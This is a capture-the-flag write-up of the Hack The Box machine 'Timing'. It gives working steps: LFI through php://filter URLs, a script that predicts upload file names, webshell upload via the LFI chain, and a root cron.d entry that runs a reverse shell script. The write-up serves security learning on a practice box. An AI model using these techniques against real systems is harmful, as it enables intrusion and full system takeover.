---
layout: default
title : muzec - Timing HTB Writeup
---

![image](https://user-images.githubusercontent.com/69868171/148070535-ebda7c61-e1a6-43b5-993f-bf66cb1df164.png)

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oA nmap/allports -v IP
```

```
# Nmap 7.91 scan initiated Thu Dec 30 21:36:12 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.135
Increasing send delay for 10.10.11.135 from 5 to 10 due to 22 out of 72 dropped probes since last increase.
Increasing send delay for 10.10.11.135 from 20 to 40 due to 16 out of 51 dropped probes since last increase.
Increasing send delay for 10.10.11.135 from 160 to 320 due to 42 out of 139 dropped probes since last increase.
Increasing send delay for 10.10.11.135 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.11.135 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Warning: 10.10.11.135 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.135
Host is up (0.22s latency).
Not shown: 63014 filtered ports, 2519 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec 30 21:39:01 2021 -- 1 IP address (1 host up) scanned in 168.93 seconds
```

We have two open ports let confirm what we have running with service detection and default nmap scripts.

```
nmap -sC -sV -oA nmap/normal -p 22,80 IP
```

```
# Nmap 7.91 scan initiated Thu Dec 30 21:39:04 2021 as: nmap -sC -sV -oA nmap/normal -p 22,80 10.10.11.135
Nmap scan report for 10.10.11.135
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 21:39:22 2021 -- 1 IP address (1 host up) scanned in 17.81 seconds
```

You can see it flashy now lol so without wasting to much of time let start diggng in make sure to add `10.10.11.135 timing.htb` to your host file.

![image](https://user-images.githubusercontent.com/69868171/148071354-ee14869b-0b8d-455c-80cc-717699aa0645.png)

Simple WebApp interesting and we have a login page before coming back to try some default credentials let keep gobuster running in the background.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.135]
└─$ gobuster dir -u http://timing.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak,sh -o gobuster.req
/images               (Status: 301) [Size: 309] [--> http://timing.htb/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/login.php            (Status: 200) [Size: 5609]
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]
/image.php            (Status: 200) [Size: 0]
/header.php           (Status: 302) [Size: 0] [--> ./login.php]
/footer.php           (Status: 200) [Size: 3937]
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]
```
Now it getting interesting but i notice something strange you can see it also right `image.php` size seems empty possible `LFI or RCE` let confirm it.

![image](https://user-images.githubusercontent.com/69868171/148072267-ba66038e-7acb-4371-87d2-915c1ffe7662.png)

Yes i know it blank let burst for some parametes.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.135]
└─$ ffuf -c -ic -r -u 'http://timing.htb/image.php?FUZZ=../../../../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs  0
img                     [Status: 200, Size: 25, Words: 3, Lines: 1]
:: Progress: [4681/4681] :: Job [1/1] :: 93 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```
Boom we found one parameter i told you it `LFI` let confirm it now by reading the passwd file from the system.

![image](https://user-images.githubusercontent.com/69868171/148073040-6024c8e2-a2ea-45a6-a75e-c311dcc0b4fc.png)

But when i try to i got blocked which is interesting let try some bypass.

![image](https://user-images.githubusercontent.com/69868171/148073393-84198eeb-d355-4035-a238-6dee5bfdcc9e.png)

Boom the php wrapper worked and we got the passwd file let try to decode it.

![image](https://user-images.githubusercontent.com/69868171/148073558-74db3072-41cf-47fd-89f0-07407e685208.png)

Now back to the login page let try and see if we can get the credentials from the `login.php` .

![image](https://user-images.githubusercontent.com/69868171/148073772-18f9c3c7-750c-49d2-acb3-6b4690543bf1.png)

But nothing man let check `db_conn.php` and see.

![image](https://user-images.githubusercontent.com/69868171/148074016-1b934436-a0d2-411b-b709-e2d3a311da73.png)

Boom a credentials but when i try it i got no luck also with some default usernames but nothing if we can recall i think we got some usernames on the passwd file let try it.

![image](https://user-images.githubusercontent.com/69868171/148074575-d7c88c76-aad0-4900-b68c-1bfd7e3867ac.png)

Boom we got in using;

```
username:- aaron
password:- aaron
```

Now that we have access going back to our gobuster result i think we found `upload.php` but when i ty to access it i got redirected to `index.php` let try using the `LFI` we got to read the page source code of `upload.php` .

**Upload.php Source Code**

```
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

Seems it can only be accessible by admin which we are not yet let check `profile.php` source code also.

**Profile.php Source Code**

```
<?php
include_once "header.php";

include_once "db_conn.php";

$id = $_SESSION['userid'];


// fetch updated user
$statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$result = $statement->execute(array('id' => $id));
$user = $statement->fetch();


?>

<script src="js/profile.js"></script>


<div class="container bootstrap snippets bootdey">

    <div class="alert alert-success" id="alert-profile-update" style="display: none">
        <strong>Success!</strong> Profile was updated.
    </div>

    <h1 class="text-primary"><span class="glyphicon glyphicon-user"></span>Edit Profile</h1>
    <hr>
    <div class="row">
        <!-- left column -->
        <div class="col-md-1">
        </div>

        <!-- edit form column -->
        <div class="col-md-9 personal-info">
            <h3>Personal info</h3>
            <form class="form-horizontal" role="form" id="editForm" action="#" method="POST">
                <div class="form-group">
                    <label class="col-lg-3 control-label">First name:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="firstName" id="firstName"
                               value="<?php if (!empty($user['firstName'])) echo $user['firstName']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Last name:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="lastName" id="lastName"
                               value="<?php if (!empty($user['lastName'])) echo $user['lastName']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Company:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="company" id="company"
                               value="<?php if (!empty($user['company'])) echo $user['company']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Email:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="email" id="email"
                               value="<?php if (!empty($user['email'])) echo $user['email']; ?>">
                    </div>
                </div>

                <div class="container">
                    <div class="row">
                        <div class="col-md-9 bg-light text-right">

                            <button type="button" onclick="updateProfile()" class="btn btn-primary">
                                Update
                            </button>

                        </div>
                    </div>
                </div>

            </form>
        </div>
    </div>
</div>
<hr>

<?php
include_once "footer.php";
?>
```

Now that is interesting i can see a role form but when i check `http://timing.htb/profile.php` the role form is missing but for the rest which are present.

![image](https://user-images.githubusercontent.com/69868171/148076009-441cd508-18e8-4d6d-9c49-2f2a1f547bc3.png)

I quickly fire on my burp suite to intercept the request and send to repeater.

![image](https://user-images.githubusercontent.com/69868171/148076461-3915a553-e490-44f0-91e1-009ccbfc690e.png)

Damn that is some bad practice we can see everything also the password hash and the role and id etc seems we can see the role in the source code of the `profile.php` that mean it possible to update the role let hit it.

![image](https://user-images.githubusercontent.com/69868171/148077165-7d25f435-cc68-444f-b96c-50da7fcb1295.png)

Boom and we can see the role change to `1` from `0` let refresh our page to confirm if we have access to the admin dashboard.

![image](https://user-images.githubusercontent.com/69868171/148077360-889e2bc0-272f-40ad-bfae-68af6c13cd74.png)

Boom we are good now we have access to the admin panel and we have an upload page.

![image](https://user-images.githubusercontent.com/69868171/148077767-e6dabd53-3bc9-456f-a659-5845d43bcffe.png)

I quickly try to upload a php file to get a reverse shell but it was a dead end i got error.

![image](https://user-images.githubusercontent.com/69868171/148078516-4ef64e8a-7510-4a7c-bb27-44130abde6f0.png)

Ahhhhhhhhhh let check the `upload.php` source code which we got with the `LFI` .

```
http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=upload.php
```

```
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

Now let me break the php code below down to make it more clear to you bruhh don't worry i know you are reading i got you man.

```
$upload_dir = "images/uploads/";    /// We Know that the upload directory anything we upload got store there

```

```
$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

```

We all know all file has a special md5 hash right so our file got uploaded and the file md5 hash would got use to rename our file and the time it got uploaded with the name we use to save our file last between it also check the image size.

```
if ($imageFileType != "jpg") {
    $error = "This extension is not allowed."; //// We know now that only jpg file is allow to be uploaded
```

```
if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
 ```
 
Surely if we upload a jpg file we should get oue file uploaded without no error.


![image](https://user-images.githubusercontent.com/69868171/148082254-f1ba3a09-9932-4a02-9327-baa696642a47.png)

Uploaded but we know our file has been rename so we can't access it with `shell.jpg` let confirm it.

![image](https://user-images.githubusercontent.com/69868171/148082709-ed61944e-ce9b-4702-87c7-4afaa2406491.png)

Now you get what am talking about so let quickly write a php code that can help us with that but we need to get the time our file got uploaded first so let intercept it with burp suite.

![image](https://user-images.githubusercontent.com/69868171/148083729-021ec90d-39a7-418f-87ae-d419f0f9a5e8.png)

Send to burp repeater.

![image](https://user-images.githubusercontent.com/69868171/148083817-2820894a-16d8-4c22-b352-6e17559d2729.png)

Let send it and the file got uploaded and we have the date now let convert it to unix timestamp using `cyberchef` .

![image](https://user-images.githubusercontent.com/69868171/148084157-0f311e35-8d40-4d5a-b17f-04c5373ba457.png)

Now let add the unix timestamp to our php code that we just wrote.

```
// save in a file name time.php //

<?php
$upload_dir = "images/uploads/";
$file = "minion.jpg";

while(true){
    $file_name = md5('$file_hash'. 1641310558) . '_' . $file;
    $target_file = $upload_dir . $file_name;
    echo $file_name;
    echo PHP_EOL;
    sleep(1);
}
```

Now let run it to get the file name.

![image](https://user-images.githubusercontent.com/69868171/148085261-8c25be4a-d172-4cd3-8dd8-15e12cb0e136.png)

Boom we got it let confirm it now.

![image](https://user-images.githubusercontent.com/69868171/148085465-6dc93fb3-d594-427f-b1c4-9693225b6738.png)

It perfection lol now that we can get the file name we uploaded let try to upload a php script which we can be use to execute a command we can chain it with the `LFI` to access it so we can execute any command we want on the system also we notice upload page content-type is not being check on the header so we can change it to `application/x-php` .

The one i use is `https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php` i download it and rename it to `shell.jpg` upload and intercept it.

![image](https://user-images.githubusercontent.com/69868171/148087267-cdb1685f-c35d-42b5-aa50-436ad7df97b6.png)

I think you already know how to get the file name so it should be easy now let access it with the `LFI` yes i know we are chaining it lol.

```
http://timing.htb/image.php?img=images/uploads/efa58f2dd075e9ffa77ee72e8d8408f2_shell.jpg
```

![image](https://user-images.githubusercontent.com/69868171/148087719-d196d6e3-a762-4b59-9e6b-3028e54519b4.png)

Boom now let try to execute a command.

![image](https://user-images.githubusercontent.com/69868171/148087864-f6559e32-8af6-4498-98ab-36b0e60db055.png)

Now we are good so i try some many thing to get a reverse shell back to my terminal but it was all dead end so i started enumerating manually lucky me i found a zip file under `/opt` .

![image](https://user-images.githubusercontent.com/69868171/148088310-e7c95f1a-fad1-486e-ba83-450f89cca09e.png)

Interesting let get the zip file using the `LFI` again i know you are tired but imagine the fun you are having now hehehehe.

```
http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=/opt/source-files-backup.zip
```

![image](https://user-images.githubusercontent.com/69868171/148089022-5f9a4e4f-bd06-4c4b-b5e3-3bc2b346eb84.png)


Now we just need to decode the base64 to file and we have the zip file easy right? .

![image](https://user-images.githubusercontent.com/69868171/148090548-a0544a00-d3d6-4079-b5ba-e2d191973544.png)

Now let download it and unzip it.

![image](https://user-images.githubusercontent.com/69868171/148090772-fd8a66dd-a386-42dc-83ee-984023c72ddd.png)

Done seems it a backup files.

![image](https://user-images.githubusercontent.com/69868171/148090885-932e9bed-72dc-48cf-972f-6b47d2dfad5d.png)

Let check if we miss any hidden folder with `ls -la` .

![image](https://user-images.githubusercontent.com/69868171/148090999-a8e69441-8861-45c2-a3e6-238cbc9e4998.png)

Boom we have a `.git` folder let check the logs.

![image](https://user-images.githubusercontent.com/69868171/148091143-30365758-834f-4f8e-aa84-53f855fdee2b.png)

We found another password let try using it on SSH with user `aaron` .

![image](https://user-images.githubusercontent.com/69868171/148091324-a37e8305-70fb-460d-a4ac-4a6b107a1256.png)

Boom we are in and we have the `user.txt` now time to get root let check `sudo` and see.

![image](https://user-images.githubusercontent.com/69868171/148091451-e656158f-0963-4234-bb78-193dfb2f5ab2.png)

interesting we can run `sudo` on `/usr/bin/netutils` let see what it does.

![image](https://user-images.githubusercontent.com/69868171/148091646-b300c8b4-34b3-485e-8edf-b0951c8d043e.png)

Seems we can use `FTP` and `HTTP` let try to download a file using the `HTTP` but let keep `pspy64` running to check the process.

![image](https://user-images.githubusercontent.com/69868171/148092066-84395375-336e-4e5a-b987-caf28b9150b3.png)

Now let run it.

![image](https://user-images.githubusercontent.com/69868171/148092950-45ddcb09-24a3-4f34-a4f7-6159fcc61680.png)

Interesting we can see a crontab is running but let confirm what `/usr/bin/netutils` doest first.

![image](https://user-images.githubusercontent.com/69868171/148093193-99b14736-fecf-49d2-8d86-8377d4c9f35f.png)

Downloaded we also notice it use `axel` to download the file `A Command-Line File Download Accelerator for Linux` cool .

![image](https://user-images.githubusercontent.com/69868171/148093437-e391b1ef-c73f-41e0-955c-e94a808ed1dc.png)

We also notice the file we download is own by root which mean on the other hand we have write access has root intersting but only if we have access to the folder so since we have no access to `/root` folder so we can't write to it but we have access to `/etc` let see what we can do.

![image](https://user-images.githubusercontent.com/69868171/148094638-16ebcc10-ba83-453f-a66c-d7250718b0b1.png)

We can't overwrite the `passwd` file because it will just be rename to `passwd.1` so not helpful let check the crons folders.

![image](https://user-images.githubusercontent.com/69868171/148095121-44f4c8e3-061f-4c43-ad46-f605a86fb67d.png)

Let setup some old school cronjobs to run has root remember we have write access has root so i change directory to `/tmp` let quickly write a one liner reverse shell in a bash script.

![image](https://user-images.githubusercontent.com/69868171/148095852-bf9680e1-6e28-4b55-a73d-716d488feba8.png)

Save and quit let make it executable.

```
chmod +x shell.sh
```

![image](https://user-images.githubusercontent.com/69868171/148096031-8696fc66-d8bb-4a9c-922b-54a9e219b770.png)

Now back to our attacking machine to create a cronjob file.

```
#  WARNING: The scripts is for a reverse shell by Muzec
#  Notice: create the file you want to run in /tmp
#  Notice: I create a simple one liner reverse shell
#  with bash scripting.

# Reverse shell in 2min
*/2 *     * * *     root   /tmp/shell.sh
```

Now let transfer it to the `cron.d` folder with `/usr/bin/netutils` .

![image](https://user-images.githubusercontent.com/69868171/148097026-a512cf1f-11b6-4524-ad06-66f82f39cda6.png)

Downloaded let confirm it and start our Ncat listener to get the shell when the cronjob run in 2 min.


![image](https://user-images.githubusercontent.com/69868171/148097250-69f4a6af-673a-4879-913d-b0a95b3b5e28.png)

Boom and we have root shell we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
